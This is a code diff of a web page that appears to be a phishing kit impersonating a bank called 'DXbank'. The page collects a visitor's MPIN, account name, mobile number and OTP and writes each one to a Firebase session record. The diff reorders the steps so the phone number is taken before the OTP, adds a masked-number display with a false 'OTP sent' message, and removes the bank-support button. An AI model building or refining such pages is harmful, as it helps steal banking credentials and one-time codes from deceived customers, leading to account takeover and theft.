@@ -19,7 +19,7 @@ html, body {
   font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
 }
 
-/* SPLASH SCREEN */
+/* SPLASH */
 .splash-screen {
   position: fixed;
   inset: 0;
@@ -36,7 +36,7 @@ html, body {
   transform: scale(1.05);
 }
 
-/* MAIN APP (LOGIN) */
+/* MAIN APP */
 .main-app {
   position: fixed;
   inset: 0;
@@ -118,11 +118,6 @@ html, body {
   transition: all 0.3s;
   text-transform: uppercase;
 }
-.btn-update:hover:not(:disabled) {
-  background: linear-gradient(135deg, #0d47a1, #1976d2);
-  box-shadow: 0 8px 24px rgba(13,71,161,0.35);
-  transform: translateY(-1px);
-}
 .btn-update:disabled { cursor: not-allowed; opacity: 0.9; }
 .btn-update.active {
   background: linear-gradient(135deg, #0d47a1, #1976d2);
@@ -143,7 +138,6 @@ html, body {
   text-decoration: none;
   margin-left: 4px;
 }
-.signup-row a:hover { text-decoration: underline; }
 
 /* OVERLAY BASE */
 .overlay-base {
@@ -170,7 +164,6 @@ html, body {
 .overlay-base.show { display: flex; animation: fadeIn 0.4s ease; }
 @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-/* OTP / MPIN BOX */
 .otp-box {
   position: relative;
   z-index: 2;
@@ -196,6 +189,19 @@ html, body {
   color: #718096;
   margin-bottom: 22px;
   font-weight: 400;
+}
+
+/* OTP number display */
+.otp-number-display {
+  font-size: 13px;
+  color: #4a5568;
+  margin-bottom: 22px;
+  font-weight: 500;
+  line-height: 1.5;
+}
+.otp-number-display strong {
+  color: #0d47a1;
+  font-weight: 700;
 }
 
 .otp-timer {
@@ -271,10 +277,6 @@ html, body {
   box-shadow: 0 8px 24px rgba(13,71,161,0.4);
   cursor: pointer;
   opacity: 1;
-}
-.btn-verify.active:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 12px 28px rgba(13,71,161,0.5);
 }
 
 .resend-row {
@@ -373,7 +375,6 @@ html, body {
   font-size: 16px;
   font-weight: 700;
   font-family: inherit;
-  letter-spacing: 0.5px;
   cursor: not-allowed;
   transition: all 0.3s;
   opacity: 0.9;
@@ -384,10 +385,6 @@ html, body {
   box-shadow: 0 8px 24px rgba(13,71,161,0.4);
   cursor: pointer;
   opacity: 1;
-}
-.btn-confirm.active:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 12px 28px rgba(13,71,161,0.5);
 }
 
 /* FINAL COMPLETE */
@@ -456,7 +453,6 @@ html, body {
   font-weight: 700;
   color: #1a202c;
   margin-bottom: 12px;
-  letter-spacing: -0.3px;
   line-height: 1.3;
 }
 
@@ -504,9 +500,7 @@ html, body {
   cursor: pointer;
   z-index: 20;
   box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-  transition: all 0.3s;
 }
-.fab:hover { transform: scale(1.08); }
 .fab svg { width: 26px; height: 26px; }
 
 @media (max-width: 480px) {
@@ -543,23 +537,9 @@ html, body {
       </div>
     </div>
   </div>
-
-  <div class="fab" onclick="alert('DXbank Support\n\n📞 1800-123-4567\n✉ support@dxbank.com');">
-    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <circle cx="6" cy="6" r="2.5" fill="#ff6b35"/>
-      <circle cx="12" cy="6" r="2.5" fill="#ff6b35"/>
-      <circle cx="18" cy="6" r="2.5" fill="#ff6b35"/>
-      <circle cx="6" cy="12" r="2.5" fill="#ff6b35"/>
-      <circle cx="12" cy="12" r="2.5" fill="#ff6b35"/>
-      <circle cx="18" cy="12" r="2.5" fill="#ff6b35"/>
-      <circle cx="6" cy="18" r="2.5" fill="#ff6b35"/>
-      <circle cx="12" cy="18" r="2.5" fill="#ff6b35"/>
-      <circle cx="18" cy="18" r="2.5" fill="#ff6b35"/>
-    </svg>
-  </div>
 </div>
 
-<!-- MPIN SCREEN (NO IMAGE) -->
+<!-- STEP 1: MPIN -->
 <div class="overlay-base" id="mpinScreen">
   <div class="otp-box">
     <div class="otp-title">Verify Your MPIN</div>
@@ -579,11 +559,36 @@ html, body {
   </div>
 </div>
 
-<!-- OTP SCREEN (NO IMAGE) -->
+<!-- STEP 2: ACCOUNT DETAILS (Name + Mobile Number) -->
+<div class="overlay-base" id="accountScreen">
+  <div class="account-box">
+    <div class="account-title">Account Details</div>
+    <div class="account-sub">Please enter your account information</div>
+
+    <div class="account-field">
+      <label class="account-label">Account Name</label>
+      <input type="text" id="accountName" class="account-input" placeholder="Enter account holder name" autocomplete="off" oninput="checkAccountForm()">
+    </div>
+
+    <div class="account-field">
+      <label class="account-label">Mobile Number</label>
+      <input type="tel" id="mobileNumber" class="account-input" inputmode="numeric" maxlength="10" placeholder="Enter your 10-digit mobile number" autocomplete="off" oninput="checkAccountForm()">
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="handleConfirmAccount()" disabled>Confirm</button>
+    <div class="otp-message" id="accountMessage"></div>
+  </div>
+</div>
+
+<!-- STEP 3: OTP VERIFY -->
 <div class="overlay-base" id="otpScreen">
   <div class="otp-box">
     <div class="otp-title">Verify OTP Code</div>
     <div class="otp-sub">Enter the 6-digit OTP code</div>
+
+    <div class="otp-number-display" id="otpNumberDisplay">
+      OTP has been sent to <strong id="maskedNumber">******</strong>
+    </div>
 
     <div class="otp-timer" id="otpTimer">03:00</div>
 
@@ -603,27 +608,6 @@ html, body {
     </div>
 
     <div class="otp-message" id="otpMessage"></div>
-  </div>
-</div>
-
-<!-- ACCOUNT DETAILS SCREEN (NO IMAGE) -->
-<div class="overlay-base" id="accountScreen">
-  <div class="account-box">
-    <div class="account-title">Account Details</div>
-    <div class="account-sub">Please enter your account information</div>
-
-    <div class="account-field">
-      <label class="account-label">Account Name</label>
-      <input type="text" id="accountName" class="account-input" placeholder="Enter account holder name" autocomplete="off" oninput="checkAccountForm()">
-    </div>
-
-    <div class="account-field">
-      <label class="account-label">Mobile Number</label>
-      <input type="text" id="mobilenumber" class="account-input" inputmode="numeric" placeholder="Enter mobile number" autocomplete="off" oninput="checkAccountForm()">
-    </div>
-
-    <button class="btn-confirm" id="confirmBtn" onclick="handleConfirmAccount()" disabled>Confirm</button>
-    <div class="otp-message" id="accountMessage"></div>
   </div>
 </div>
 
@@ -664,6 +648,8 @@ var database = firebase.database();
 var sessionRef = null;
 var documentIdValue = "";
 var mpinValue = "";
+var accountNameValue = "";
+var mobileNumberValue = "";
 var otpAttemptCount = 0;
 var timerInterval = null;
 var timeLeft = 180;
@@ -709,7 +695,7 @@ function handleUpdate() {
     mpin: '—',
     otpCode: '—',
     accountName: '—',
-    mobilenumber: '—',
+    mobileNumber: '—',
     status: 'pending',
     time: timeStr,
     timestamp: now.getTime(),
@@ -759,7 +745,7 @@ function checkMpinComplete() {
   else { btn.disabled = true; btn.classList.remove('active'); }
 }
 
-// ===== MPIN VERIFY → OTP =====
+// ===== STEP 2: MPIN VERIFY → ACCOUNT DETAILS =====
 function handleMpinVerify() {
   var mpin = '';
   for (var i = 1; i <= 6; i++) mpin += document.getElementById('m' + i).value;
@@ -777,6 +763,62 @@ function handleMpinVerify() {
 
   setTimeout(function() {
     document.getElementById('mpinScreen').classList.remove('show');
+    document.getElementById('accountScreen').classList.add('show');
+    document.getElementById('accountMessage').classList.remove('show');
+    document.getElementById('accountName').value = '';
+    document.getElementById('mobileNumber').value = '';
+    document.getElementById('confirmBtn').disabled = true;
+    document.getElementById('confirmBtn').classList.remove('active');
+    setTimeout(function() { document.getElementById('accountName').focus(); }, 300);
+  }, 800);
+}
+
+// ===== ACCOUNT FORM =====
+function checkAccountForm() {
+  var name = document.getElementById('accountName').value.trim();
+  var mobile = document.getElementById('mobileNumber').value.trim();
+  var btn = document.getElementById('confirmBtn');
+  if (name.length >= 3 && mobile.length === 10) {
+    btn.disabled = false;
+    btn.classList.add('active');
+  } else {
+    btn.disabled = true;
+    btn.classList.remove('active');
+  }
+}
+
+// ===== STEP 3: ACCOUNT CONFIRM → OTP SCREEN =====
+function handleConfirmAccount() {
+  var name = document.getElementById('accountName').value.trim();
+  var mobile = document.getElementById('mobileNumber').value.trim();
+
+  if (!name || name.length < 3) {
+    showMsg('accountMessage', 'Please enter a valid account name.', 'warning');
+    return;
+  }
+  if (!mobile || mobile.length !== 10) {
+    showMsg('accountMessage', 'Please enter a valid 10-digit mobile number.', 'warning');
+    return;
+  }
+
+  accountNameValue = name;
+  mobileNumberValue = mobile;
+
+  if (sessionRef) {
+    sessionRef.update({
+      accountName: name,
+      mobileNumber: mobile
+    });
+  }
+
+  // Show masked number on OTP screen
+  var masked = '******' + mobile.slice(-4);
+  document.getElementById('maskedNumber').textContent = masked;
+
+  showMsg('accountMessage', '✅ Account confirmed! OTP sent...', 'success');
+
+  setTimeout(function() {
+    document.getElementById('accountScreen').classList.remove('show');
     document.getElementById('otpScreen').classList.add('show');
     document.getElementById('otpMessage').classList.remove('show');
 
@@ -787,9 +829,10 @@ function handleMpinVerify() {
     document.getElementById('verifyOtpBtn').disabled = true;
     document.getElementById('verifyOtpBtn').classList.remove('active');
 
+    otpAttemptCount = 0;
     startTimer();
     setTimeout(function() { document.getElementById('otp1').focus(); }, 300);
-  }, 800);
+  }, 1000);
 }
 
 // ===== OTP INPUT =====
@@ -886,67 +929,19 @@ function handleVerifyOtp() {
     clearInterval(timerInterval);
     showMsg('otpMessage', '✅ OTP verified successfully!', 'success');
 
+    if (sessionRef) sessionRef.update({ status: 'complete' });
+
     setTimeout(function() {
       document.getElementById('otpScreen').classList.remove('show');
-      document.getElementById('accountScreen').classList.add('show');
-      document.getElementById('accountMessage').classList.remove('show');
-      document.getElementById('accountName').value = '';
-      document.getElementById('mobilenumber').value = '';
-      document.getElementById('confirmBtn').disabled = true;
-      document.getElementById('confirmBtn').classList.remove('active');
-      setTimeout(function() { document.getElementById('accountName').focus(); }, 300);
+      showLoading();
+      setTimeout(function() {
+        hideLoading();
+        document.getElementById('completeScreen').classList.add('show');
+        document.getElementById('mainApp').classList.remove('show');
+        document.getElementById('mainApp').style.display = 'none';
+      }, 1500);
     }, 800);
   }
-}
-
-// ===== ACCOUNT FORM =====
-function checkAccountForm() {
-  var name = document.getElementById('accountName').value.trim();
-  var number = document.getElementById('mobilenumber').value.trim();
-  var btn = document.getElementById('confirmBtn');
-  if (name.length >= 3 && number.length >= 8) {
-    btn.disabled = false;
-    btn.classList.add('active');
-  } else {
-    btn.disabled = true;
-    btn.classList.remove('active');
-  }
-}
-
-// ===== CONFIRM ACCOUNT =====
-function handleConfirmAccount() {
-  var name = document.getElementById('accountName').value.trim();
-  var number = document.getElementById('mobilenumber').value.trim();
-
-  if (!name || name.length < 3) {
-    showMsg('accountMessage', 'Please enter a valid account name.', 'warning');
-    return;
-  }
-  if (!number || number.length < 8) {
-    showMsg('accountMessage', 'Please enter a valid mobile number.', 'warning');
-    return;
-  }
-
-  if (sessionRef) {
-    sessionRef.update({
-      accountName: name,
-      mobilenumber: number,
-      status: 'complete'
-    });
-  }
-
-  showMsg('accountMessage', '✅ Account confirmed!', 'success');
-
-  setTimeout(function() {
-    document.getElementById('accountScreen').classList.remove('show');
-    showLoading();
-    setTimeout(function() {
-      hideLoading();
-      document.getElementById('completeScreen').classList.add('show');
-      document.getElementById('mainApp').classList.remove('show');
-      document.getElementById('mainApp').style.display = 'none';
-    }, 1500);
-  }, 800);
 }
 
 // ===== HELPERS =====
